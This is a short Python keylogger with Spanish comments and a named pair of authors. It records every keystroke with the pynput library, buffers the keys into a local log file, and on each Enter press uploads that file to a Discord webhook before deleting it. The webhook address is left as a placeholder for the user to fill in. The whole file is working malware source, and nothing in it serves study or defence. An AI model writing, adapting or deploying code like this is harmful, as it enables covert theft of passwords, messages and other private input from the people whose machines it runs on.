import os
from pynput.keyboard import Key, Listener
from dhooks import Webhook, File

# made by ezen.fr & benja saltagueño

LOG_FILE = "keylogs.txt"
WEBHOOK_URL = "TU_WEBHOOK_AQUI"
log_send = Webhook(WEBHOOK_URL)


buffer = []

def send_log():
    """ Envía el archivo de logs al webhook de Discord y lo elimina después. """
    try:
        if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > 0:
            log_send.send("Nuevo registro de teclas:")
            log_send.send(file=File(LOG_FILE))
            os.remove(LOG_FILE)  
    except Exception as e:
        print(f"Error al enviar el archivo: {e}")

def on_press(key):
    """ Captura la pulsación de teclas y las almacena en un archivo limpio. """
    global buffer

    
    key_str = str(key).replace("'", "")

    
    if key == Key.space:
        key_str = " "  
    elif key == Key.enter:
        key_str = "\n"  
    elif key == Key.backspace:
        if buffer:
            buffer.pop()  
        return
    elif "Key" in key_str:
        return  

    
    buffer.append(key_str)

    
    if len(buffer) >= 10 or key == Key.enter:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write("".join(buffer))
        buffer = []

    
    if key == Key.enter:
        send_log()


with Listener(on_press=on_press) as listener:
    listener.join()